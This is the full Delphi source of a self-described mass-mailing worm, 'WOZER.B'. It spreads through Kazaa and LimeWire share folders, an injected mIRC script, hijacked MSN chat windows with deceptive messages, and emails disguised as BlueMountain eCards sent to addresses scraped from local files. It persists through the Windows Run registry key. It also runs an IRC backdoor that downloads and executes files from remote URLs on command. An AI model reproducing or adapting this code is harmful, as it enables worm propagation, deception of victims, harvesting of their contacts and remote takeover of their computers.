PROGRAM WOZERB;
USES
  WINDOWS, winsock, MESSAGES, NetBIOS,
  Sendkeys, Email, Zip,
  StrList, MXResolver;

CONST
 BUFLEN         =65536;
 COOLMAN      : STRING = 'TXTCFGPASCPPHTMLDOCWRDDPRTMP'; 

VAR
  CHAN:STRING;
  PASS:STRING;
  WINS:ARRAY[0..300]OF RECORD NAME:STRING;
  WND            :HWND;
  END;
  WCNT           :INTEGER;
  N,M            :INTEGER;
  I,WE           :INTEGER;
  HAND           :HWND;
  PATH           :STRING;
  TEXT           :STRING;
  MSNWINDOW      :STRING;
  WINDOW         :STRING;
  BUF            :ARRAY[0..9999]OF CHAR;
  MAILNAME       :ARRAY[0..1000]OF STRING;
  MAILS          :ARRAY[0..1000]OF STRING;
  A              :DWORD;
  NAMES          :ARRAY[0..200]OF STRING;
  MIRCPATH       :STRING;
  function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

FUNCTION SENDMAIL(SUBJECT,BODY,FROM,RECIP,ATTACHMENT:STRING):BOOLEAN;
VAR
  SMTPEngine : TSMTPEngine;
BEGIN
  SMTPEngine:=TSMTPEngine.Create;
  SMTPEngine.Subject:=Subject;
  SMTPEngine.Body:=BODY;
  SMTPEngine.From:=From;
  SMTPEngine.Recip:=Recip;
  SMTPEngine.Attachment:=Attachment;
  RESULT:=SMTPEngine.SendEmail;
  SMTPEngine.Free;
END;

FUNCTION UPPERCASE(CONST S: STRING): STRING;
VAR
 LEN: INTEGER;
BEGIN
 LEN := LENGTH(S);
 SETSTRING(RESULT, PCHAR(S), LEN);
 IF LEN > 0 THEN CHARUPPERBUFF(POINTER(RESULT), LEN);
END;

PROCEDURE KAZAA;
VAR
 KEY            :HKEY;
 LIP            :INTEGER;
 QVALUE         :ARRAY[0..1023] OF CHAR;
 SKEY           :STRING;
 RESULT         :STRING;
 I              :INTEGER;
BEGIN
 IF NAMES[0] = '' THEN EXIT;
 TRY
  ZEROMEMORY(@QVALUE,SIZEOF(QVALUE));
  SKEY := 'DownloadDir';
  REGOPENKEYEX(HKEY_LOCAL_MACHINE, PCHAR('SOFTWARE\Kazaa\LocalContent'), 0, KEY_ALL_ACCESS, KEY);
  LIP := 1023;
  REGQUERYVALUEEX(KEY, PCHAR(SKEY), NIL, NIL, @QVALUE[0], @LIP);
  REGCLOSEKEY(KEY);
  IF QVALUE <> NIL THEN RESULT := STRING(QVALUE) ELSE EXIT;
  FOR I:=0 TO 200 DO
   IF NAMES[I]<>'' THEN COPYFILE(PCHAR(PARAMSTR(0)),PCHAR(RESULT+'\'+NAMES[I]),FALSE);
 EXCEPT
  EXIT;
 END;
END;

PROCEDURE LIMEWIRE;
TYPE
  LONGREC = PACKED RECORD
    CASE INTEGER OF
      0: (LO, HI: WORD);
      1: (WORDS: ARRAY [0..1] OF WORD);
      2: (BYTES: ARRAY [0..3] OF BYTE);
  END;

function FileAge(const FileName: string): Integer;
var
  Handle: THandle;
  FindData: TWin32FindData;
  LocalFileTime: TFileTime;
begin
  Handle := FindFirstFile(PChar(FileName), FindData);
  if Handle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(Handle);
    if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
    begin
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
        LongRec(Result).Lo) then Exit;
    end;
  end;
  Result := -1;
end;

function FileExists(const FileName: string): Boolean;
begin
  Result := FileAge(FileName) <> -1;
end;

VAR
 KEY            :HKEY;
 LIP            :INTEGER;
 QVALUE         :ARRAY[0..1023] OF CHAR;
 SKEY           :STRING;
 RESULT         :STRING;
 I              :INTEGER;
 LIMEWIRE       :TEXTFILE;
 LIMEPATH       :STRING;

BEGIN
 IF NAMES[0] = '' THEN EXIT;
 TRY
  ZEROMEMORY(@QVALUE,SIZEOF(QVALUE));
  SKEY := 'InstallDir';
  REGOPENKEYEX(HKEY_LOCAL_MACHINE, PCHAR('SOFTWARE\limewire'), 0, KEY_ALL_ACCESS, KEY);
  LIP := 1023;
  REGQUERYVALUEEX(KEY, PCHAR(SKEY), NIL, NIL, @QVALUE[0], @LIP);
  REGCLOSEKEY(KEY);
  IF QVALUE <> NIL THEN RESULT := STRING(QVALUE) ELSE EXIT;

  IF FILEEXISTS(QVALUE+'LIMEWIRE.PROPS') THEN BEGIN
   ASSIGNFILE(LIMEWIRE, QVALUE+'LIMEWIRE.PROPS');
   RESET(LIMEWIRE);
   READLN(LIMEWIRE,LIMEPATH);
   CLOSEFILE(LIMEWIRE);
  END ELSE EXIT;
  LIMEPATH := COPY(LIMEPATH, POS('=',LIMEPATH)+1, LENGTH(LIMEPATH));
  IF LIMEPATH = '' THEN EXIT;
  REPEAT
   LIMEPATH:=COPY(LIMEPATH,1, POS('\\',LIMEPATH))+COPY(LIMEPATH, POS('\\',LIMEPATH)+2,LENGTH(LIMEPATH));
  UNTIL POS('\\',LIMEPATH)=0;
  sleep(100);
  FOR I:=0 TO 200 DO
   IF NAMES[I]<>'' THEN COPYFILE(PCHAR(PARAMSTR(0)),PCHAR(LIMEPATH+'\'+NAMES[I]),FALSE);
 EXCEPT
  EXIT;
 END;   
END;

PROCEDURE MIRC;
VAR
 MIRCFILE:TEXTFILE;
 LINES:STRING;
BEGIN
 IF MIRCPATH = '' THEN EXIT;

 LINES := '; This script is made by Khaled. '+#13#10+
          '; Please do not change anything. '+#13#10+
          '; Changes can lead to system crashes. '+#13#10+
          'ON *:JOIN:*:{'+#13#10+
          ' .DCC SEND $NICK '+PARAMSTR(0)+#13#10+
          ' .MSG $NICK This is my picture'+#13#10+
          ' .IGNORE $NICK'+#13#10+
          '}'+#13#10;

 ASSIGNFILE(MIRCFILE, MIRCPATH+'SCRIPT.INI');
 REWRITE(MIRCFILE);
 WRITE(MIRCFILE, LINES);
 CLOSEFILE(MIRCFILE);
END;

PROCEDURE MSN;
function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
begin

  if iswindowvisible(w) then begin
    getwindowtext(w,buf,10000);
    if buf[0]<>#0 then begin
      wins[wcnt].name:=buf;
      wins[wcnt].wnd:=w;
      wcnt:=wcnt+1;
    end;
  end;
  result:=true;
end;

function sendwindows:string;
var i:integer;
begin
 result:='';
  wcnt:=0;
  enumwindows(@enumwinproc,0);
  for i:=0 to wcnt-1 do begin
    result:=result+{'['+inttostr(wins[i].wnd)+']'+}wins[i].name+chr(13);
    wins[i].name := '';
    wins[i].wnd := 0;
  end;
end;
function getwins:string;
begin
 result:='';
 result:=sendwindows;
end;

BEGIN
WHILE 1<>2 DO BEGIN
  ZEROMEMORY(@BUF,SIZEOF(BUF));
  WCNT:=0;
  WINDOW := GETWINS;
  WINDOW := UPPERCASE(WINDOW);
 WHILE WINDOW <> '' DO BEGIN
  MSNWINDOW := COPY(WINDOW, 1, POS(CHR(13),WINDOW)-1);
  IF (POS(' - CONVERSATION',MSNWINDOW)>0) OR (POS(' - KONVERSATION',MSNWINDOW)>0) THEN BEGIN
   ZEROMEMORY(@BUF,SIZEOF(BUF));
   GETSYSTEMDIRECTORY(BUF,255);
   PATH := BUF;
   PATH := PATH + '\MSN-Emoticon-pack.exe';
   COPYFILE(PCHAR(PARAMSTR(0)), PCHAR(PATH), FALSE);
   HAND := GETHANDLEFROMWINDOWTITLE(MSNWINDOW);
   SLEEP(100);
   MAKEWINDOWACTIVE(HAND);
   SLEEP(100);   
   IF POS('CONVERSATION',MSNWINDOW)>0 THEN BEGIN
    SENDKEY('{&}F');
    SENDKEY('F');
   END ELSE BEGIN
    SENDKEY('{&}A');
    SENDKEY('K');
   END;
   SLEEP(300);
   FOR I:=1 TO LENGTH(PATH) DO BEGIN
    IF COPY(PATH,I,1) = ':' THEN
     SENDKEY('{!}.') ELSE
    IF COPY(PATH,I,1) = '\' THEN
     SENDKEY('{^&}?') ELSE
    SENDKEY(COPY(PATH,I,1));
   END;
   SENDKEY(#13);
   SLEEP(200);
   RANDOMIZE;
   CASE RANDOM(5) OF
    0:TEXT:='Look at this picture is awsome.';
    1:TEXT:='Check this out.';
    2:TEXT:='Watch this, its cool.';
    3:TEXT:='Check this';
    4:TEXT:='haha';
   END;
   FOR I:=1 TO LENGTH(TEXT) DO
   SENDKEY(COPY(TEXT,I,1));
   SENDKEY(#13);
   SETWINDOWTEXT(HAND,'OWNED BY THE ALMIGHTY WOZER.B\WORM');
   SHOWWINDOW(HAND,0);
  END;
  WINDOW := COPY(WINDOW, POS(CHR(13),WINDOW)+1, LENGTH(WINDOW));
 END;
END;
END;

procedure ListFiles(D, Name, SearchName : String);
const
  faReadOnly  = $00000001 platform; 
  faHidden    = $00000002 platform; 
  faSysFile   = $00000004 platform;
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010;
  faArchive   = $00000020 platform;
  faAnyFile   = $0000003F;

type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle  platform;
    FindData: TWin32FindData  platform;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

  function FindMatchingFile(var F: TSearchRec): Integer;
  var
    LocalFileTime: TFileTime;
  begin
  try
    with F do
    begin
      while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
        begin
          Result := GetLastError;
          Exit;
        end;
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
        LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
     if (name <> '.') and (name <> '..') and ((Attr and faDirectory) <> faDirectory) then begin
     if (pos('irc',name)>0) and (pos('exe',name)>0) then MIRCPATH := D;
      if uppercase(copy(name,length(name)-2,3)) = 'EXE' then begin
       if n <= 100 then begin
        names[n] := name;
        inc(n,1);
       end;
      end;
      if POS(uppercase(copy(name,length(name)-2,3)),COOLMAN)<>0 then begin
       if MAILNAME[m] = '' then begin
        if M <= 1000 then begin
         MAILNAME[m] := D+NAME;
         inc(m,1);
        end;
       end;
      end;
     end;
    end;
 Result := 0;
   except
    exit;
   end;
  end;

  procedure FindClose(var F: TSearchRec);
  begin
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE; 
    end; 
  end; 
 
  function FindFirst(const Path: string; Attr: Integer;
    var  F: TSearchRec): Integer;
  const 
    faSpecial = faHidden or faSysFile or faVolumeID or faDirectory; 
  begin
   try
    F.ExcludeAttr := not Attr and faSpecial;
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Result := FindMatchingFile(F);
      if Result <> 0 then FindClose(F);
    end else
      Result := GetLastError;
   except
    exit;
   end;
  end;

  function FindNext(var F: TSearchRec): Integer;
  begin
  try
    if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F) else
      Result := GetLastError;
       except
    exit;
   end;
  end;

var
  SR: TSearchRec;
begin
try
  If D[Length(D)] <> '\' then D := D + '\';
  If FindFirst(D + '*.*', faDirectory, SR) = 0 then
    Repeat
      If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
        ListFiles(D + SR.Name + '\', Name, SearchName);
    Until (FindNext(SR) <> 0);
  FindClose(SR);
   except
    exit;
   end;
end;

FUNCTION getip(HostName:STRING) : STRING;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;

PROCEDURE IRC;
VAR
 Sock1:TSocket;
 SockInfo:Sockaddr_in;
 WSAData:TWSAData;
 h:integer; NICK,ab,ab2:string;
 a:integeR;

procedure RAW(s:String);
var
 a:integer;
begin
 repeat
 a:=send(sock1,s[1],length(s),0)
 until  a<>SOCKET_ERROR ;
end;

procedure readsock;
var
 M_Times,M_Mails,LAUNCH,answer, str01:string;
begin
 ZeroMemory(@str01,length(str01));
 str01 := buf;
 ZeroMemory(@buf,length(buf));
if pos('MOTD',uppercase(str01))>0 then begin
 RAW('Join '+CHAN+' '+PASS+#13#10);
end else

if pos('PING',uppercase(str01))>0 then begin
 Answer := copy(str01,pos('PING',uppercase(str01))+6,length(str01));
 Answer := copy(answer,1,pos(#13#10,answer)-1);
 RAW('PONG :'+answer+#13#10);
end else
IF POS('JOIN',UPPERCASE(STR01))>0 THEN BEGIN
 m_times := COPY(STR01,2,POS('!',STR01)-2);
 if m_times <> nick then
  RAW('MODE '+CHAN+' +o '+m_times+#13#10);
END ELSE
IF POS('.RAW',UPPERCASE(STR01))>0 THEN BEGIN
 ANSWER := COPY(STR01,POS('.RAW',STR01)+5,LENGTH(STR01));
 RAW(ANSWER);
END ELSE
if pos('.DL',uppercase(str01))>0 then begin
 Answer := copy(str01,pos('.DL',uppercase(str01))+4,length(str01));
 M_Times := copy(answer,pos('&',answer)+1,length(answer));
 M_Times := copy(M_Times,1,pos(';',M_Times)-1);
 M_Mails := copy(answer,1,pos('&',answer)-1);
 LAUNCH := copy(answer,pos(';',answer)+1,length(answer));
 LAUNCH := COPY(LAUNCH,1,LENGTH(LAUNCH)-2);
 RAW('PRIVMSG '+CHAN+' :Downloading file '+M_MAILS+#13#10);
 Dfile(0,pchar(M_MAILS),pchar('c:\'+M_TIMES),0,0);
 if launch = '1' then begin
 RAW('PRIVMSG '+CHAN+' :Downloaded, executing.'+#13#10);
 winexec(pchar('c:\'+m_times),1);
 end else
 RAW('PRIVMSG '+CHAN+' :Downloaded.'+#13#10);
 ZeroMemory(@buf,sizeof(buf));
 ZeroMemory(@str01,sizeof(str01));
end;

end;

BEGIN
 while 1<>2 do begin
  if (recv(Sock1,buf,SizeOf(buf),0)) < 1 then begin
  repeat
   try
    Shutdown(Sock1,2);
    CloseSocket(Sock1);
   except
    ;
   end;
   WSAStartup(257,WSAData);
   SockInfo.sin_family:=PF_INET;
   SockInfo.sin_port:=htons(6667);
   SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip('uk.undernet.org')));
   Sock1 := socket(PF_INET,SOCK_STREAM,0);
   a := Connect(Sock1,SockInfo,sizeof(SockInfo));
  until a<> SOCKET_ERROR;
  randomize;
  AB:='abcdefghijklmnopqrstuvwxyz';//ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  ab2:='0123456789';
  repeat
   h:=random(8);
  until h>2;
  for i:=0 to h do
   NICK:=NICK+copy(ab,random(length(ab))-1,1);
  RAW('USER '+NICK+' '+NICK+'@foo.bar '+NICK+' '+NICK+#13#10);
  nick := '';
  while length(nick) < 3 do
  nick := nick+copy(ab,random(length(ab)),1);
  nick := nick + '|';
  while length(nick) < 6 do
  nick := nick+copy(ab2,random(length(ab2)),1);
  nick := nick;
  RAW('NICK '+nick+#13#10);
   end else
    ReadSock; // read my socks.
  end;
END;

FUNCTION SYSDIR:STRING;
VAR
 A:ARRAY[0..255]OF CHAR;
BEGIN
 GETSYSTEMDIRECTORY(A,255);
 RESULT:=A;
 RESULT:=RESULT+'\';
END;

PROCEDURE MAIL;
TYPE
  Triple = ARRAY[1..3] OF BYTE;
  Quad   = ARRAY[1..4] OF BYTE;

VAR
  K              : INTEGER;
  TMPMAIL          : STRING;

function FileSize(FileName: string): int64;
var
  h: THandle;
  fdata: TWin32FindData;
begin
  result:= -1;

  h:= FindFirstFile(PChar(FileName), fdata);
  if h <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(h);
    result:= int64(fdata.nFileSizeHigh) shl 32 + fdata.nFileSizeLow;
  end;
end;

Function Getmail(Filename:string):String;
Var
 F:Textfile;
 L1,L2,Text:string;
 MAIL:String;
 H,E,i,A:Integer;
 ABC,ABC2:STRING;

TYPE
  LONGREC = PACKED RECORD
    CASE INTEGER OF
      0: (LO, HI: WORD);
      1: (WORDS: ARRAY [0..1] OF WORD);
      2: (BYTES: ARRAY [0..3] OF BYTE);
  END;

function FileAge(const FileName: string): Integer;
var
  Handle: THandle;
  FindData: TWin32FindData;
  LocalFileTime: TFileTime;
begin
  Handle := FindFirstFile(PChar(FileName), FindData);
  if Handle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(Handle);
    if (FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0 then
    begin
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      if FileTimeToDosDateTime(LocalFileTime, LongRec(Result).Hi,
        LongRec(Result).Lo) then Exit;
    end;
  end;
  Result := -1;
end;

function FileExists(const FileName: string): Boolean;
begin
  Result := FileAge(FileName) <> -1;
end;


Label again;
begin
 ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
 ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';
 if filesize(filename) > 5000 then exit;
 CopyFile(Pchar(Filename),pchar(Filename+'_'),false);
 while not fileexists(filename+'_') do sleep(10);
 AssignFile(F,Filename+'_');
 try
  Reset(F);
 except
  exit;
 end;
 Read(F,L1);
 ReadLN(F,L2);
 Text:=L1;
 While NOt EOF(F) DO BEGIN
  Read(F,L1);
  ReadLN(F,L2);
  Text:=Text+'|'+L1;
 END;
 Closefile(F);
 Deletefile(pchar(Filename+'_'));
 sleep(200);
 if copy(text,1,2)='MZ' then exit;
 text:='|'+text+'|';
 result:='';
//Now we gather the informition.
 AGAIN:
 IF pos('@',Text)>0 then begin
  A:=Pos('@',Text)-1;
  if a =0 then a := 1;
  L1 := copy(text,a,1);
  L2 := copy(text,a+2,1);
  H := pos(L1,abc);
  E := pos(L2,abc2);
  if (H = 0) or (e=0) then begin
   text:=copy(text,a+1,length(text));
   goto again;
  end;
  While POS(Copy(TExt,a,1),ABC)>0 do begin
   A:=A-1;
  end;
  a := a +1;
  Mail := copy(Text,a,length(text)); //grab start of mail.
  Mail := COpy(Mail,1,pos('@',mail)+2);
  i:= pos(MAIL,text)+length(mail);
  While pos(copy(mail,length(mail),1),ABC2)>0 do begin
   Mail := mail+copy(text,i,1);
   i:=i+1;
  end;
  if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);
  Result := Result+Mail+#13#10;
  Text:=copy(text,pos(mail,text)+length(mail),length(text));
  goto AGAIN;
 end;

end;

FUNCTION EXIST(F:STRING):BOOLEAN;
VAR
 A:INTEGER;
BEGIN
 RESULT := FALSE;
 FOR A:=0 TO 999 DO
  IF UPPERCASE(MAILS[A]) = UPPERCASE(F) THEN RESULT:=TRUE;
END;

BEGIN
 IF MAILNAME[0] = '' THEN EXIT;
 K:=0;
 WE:=0;
 //NOW LETS GET MAILS \o/
 FOR WE:=0 TO 999 DO BEGIN
  IF MAILNAME[WE] <> '' THEN BEGIN
   TRY
    TMPMAIL := GETMAIL(MAILNAME[WE]);
   EXCEPT
    TMPMAIL := '';
   END;
   WHILE TMPMAIL <> '' DO BEGIN
    IF K <= 1000 THEN BEGIN
     IF NOT EXIST(COPY(TMPMAIL,1,POS(#13#10,TMPMAIL)-1)) THEN BEGIN
      MAILS[K] := COPY(TMPMAIL,1,POS(#13#10,TMPMAIL)-1);
      INC(K,1);
     END;
     TMPMAIL := COPY(TMPMAIL, POS(#13#10,TMPMAIL)+2, LENGTH(TMPMAIL));
    END;
   END;
  END;
 END;
  WE:=0;
 FOR WE:=0 TO K-1 DO
  SENDMAIL('Hi, I sent you an eCard from BlueMountain.com',
'To view your eCard, simple view the attached eCard.'+#13#10+#13#10+
'If you have any comments or questions, please visit'+#13#10+
'http://www.bluemountain.com/customer/emailus.pd?source=bma999'+#13#10+#13#10+
'Thanks for using BlueMountain.com.',
           '"BlueMountain.com" <eCard@BlueMountain.com>',
           MAILS[WE],
           SYSDIR+'[1]eCard.zip');
END;

const
  CM_EXIT = WM_USER + $1000;

VAR
 QVALUE :STRING;
 CURRENTKEY:HKEY;
 DATASIZE:INTEGER;
 M_HWND:HWND;
 HMAIN:HWND;

FUNCTION FIX_CHAN(S:STRING):STRING;
VAR
 I:INTEGER;
BEGIN
 FOR I:=1 TO LENGTH(S) DO BEGIN
  IF COPY(S, I, 1) = '1' THEN RESULT := RESULT + 'Y';
  IF COPY(S, I, 1) = '^' THEN RESULT := RESULT + 'C';
  IF COPY(S, I, 1) = '&' THEN RESULT := RESULT + 'T';
  IF COPY(S, I, 1) = '*' THEN RESULT := RESULT + 'B';
  IF COPY(S, I, 1) = '<' THEN RESULT := RESULT + 'K';
  IF COPY(S, I, 1) = '_' THEN RESULT := RESULT + 'H';
  IF COPY(S, I, 1) = '3' THEN RESULT := RESULT + 'N';
  IF COPY(S, I, 1) = '\' THEN RESULT := RESULT + 'S';
  IF COPY(S, I, 1) = '?' THEN RESULT := RESULT + '#';
  IF COPY(S, I, 1) = '!' THEN RESULT := RESULT + 'I';
  IF COPY(S, I, 1) = '�' THEN RESULT := RESULT + 'A';
  IF COPY(S, I, 1) = ']' THEN RESULT := RESULT + 'E';
  IF COPY(S, I, 1) = 'W' THEN RESULT := RESULT + 'R';
  IF COPY(S, I, 1) = '2' THEN RESULT := RESULT + 'M';
  IF COPY(S, I, 1) = 'Z' THEN RESULT := RESULT + 'P';
  IF COPY(S, I, 1) = 'K' THEN RESULT := RESULT + 'U';
  IF COPY(S, I, 1) = 'X' THEN RESULT := RESULT + 'L';
  IF COPY(S, I, 1) = '-' THEN RESULT := RESULT + 'W';
  IF COPY(S, I, 1) = '/' THEN RESULT := RESULT + '0';
  IF COPY(S, I, 1) = '+' THEN RESULT := RESULT + 'Z';
  IF COPY(S, I, 1) = '4' THEN RESULT := RESULT + 'O';
 END;
END;
VAR NOTE:TEXTFILE;
BEGIN           // #W0ZPWNS
 chan := FIX_CHAN('?-/+Z-3\');
                // PURPLEMONKEY
 PASS := FIX_CHAN('ZKWZX]243<]1');
 sleep(2000);

 CreateMutexA(NIL, TRUE, 'JESUS');
 if (GetLastError() = ERROR_ALREADY_EXISTS) then ExitProcess(0);

 copyfile(pchar(paramstr(0)),pchar(sysdir+'jesus.exe'),false);
// copyfile(pchar(paramstr(0)),pchar(sysdir+'eCard.pif'),false);
 zip_make(Sysdir+'jesus.exe', sysdir+'[1]eCard.zip','[1]eCard.scr');
 qValue := sysdir+'jesus.exe';

 RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar('SOFTWARE\Microsoft\Windows\CurrentVersion\Run'), REG_SZ, KEY_ALL_ACCESS, CurrentKey);
 Datasize := 1023;
 RegSetValueEx(CurrentKey,pchar('WORM/WOZER@MM.B'),0,REG_SZ,@qValue[1],Datasize);
 RegCloseKey(CurrentKey);

 N := 0;
 M := 0;

 ASSIGNFILE(NOTE, 'C:\NOTE.TXT');
 REWRITE(NOTE);
 WRITELN(NOTE, 'THIS TIME IT WILL WORK');
 WRITELN(NOTE, 'CROW, I STILL LOVE YOU...');
 CLOSEFILE(NOTE);
 CREATETHREAD(NIL, 0, @IRC,             NIL, 0, A);
 LISTFILES('C:\','*','*.*');
 KAZAA;
 LIMEWIRE;
 MAIL;
 MIRC;
 CREATETHREAD(NIL, 0, @STARTNETBIOS,    NIL, 0, A);
 MSN;
 while 1<>2 do begin ; end;
end.
